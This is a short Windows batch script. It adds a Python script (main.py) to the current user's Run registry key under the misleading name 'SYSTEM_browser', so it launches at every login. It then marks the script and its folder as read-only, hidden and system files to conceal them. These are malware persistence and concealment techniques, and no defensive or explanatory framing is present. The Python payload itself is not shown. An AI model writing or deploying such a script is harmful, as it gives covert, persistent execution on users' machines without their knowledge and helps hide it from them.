@echo off
setlocal enabledelayedexpansion

REM === Paths and registry settings ===
set "PYTHON_PATH=%LocalAppData%\Programs\Python\Python312\python.exe"
set "SCRIPT_PATH=%~dp0main.py"
set "SCRIPT_DIR=%~dp0"
set "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "REG_VALUE=SYSTEM_browser"

REM === Check if Python exists ===
if not exist "%PYTHON_PATH%" (
    goto :end
)

REM === Add script to Windows autostart ===
reg add "%REG_KEY%" /v "%REG_VALUE%" /t REG_SZ /d "\"%PYTHON_PATH%\" \"%SCRIPT_PATH%\"" /f >nul

REM === Set Read-only, Hidden, System attributes ===
attrib +r +h +s "%SCRIPT_PATH%" >nul
attrib +r +h +s "%SCRIPT_DIR%" >nul

:end
endlocal
